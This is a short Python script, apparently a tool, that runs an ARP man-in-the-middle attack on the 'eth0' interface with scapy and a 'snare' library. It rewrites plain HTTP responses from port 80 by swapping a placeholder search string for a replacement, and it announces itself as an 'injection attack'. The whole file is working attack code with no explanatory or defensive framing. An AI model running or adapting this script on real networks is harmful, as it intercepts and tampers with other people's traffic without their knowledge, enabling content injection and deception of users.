import scapy.all as scapy
import snare

# Hello
@snare.tcpfilter
def inject(pkt):
  if all(layer in pkt for layer in (scapy.IP, scapy.TCP)):
      if scapy.Raw in pkt and pkt[scapy.TCP].sport == 80:

          s = b"search"
          r = b"replacement"

          raw = pkt[scapy.Raw]
          if s in raw.load:
              raw.load = raw.load.replace(s, r)
              print(pkt.show())
  return pkt

sniffer = snare.Sniffer(
    iface="eth0",
    modules=[snare.ArpMitmModule(filter=inject)]
)
sniffer.start()
input("Starting injection attack. Press enter to quit.")
sniffer.stop()
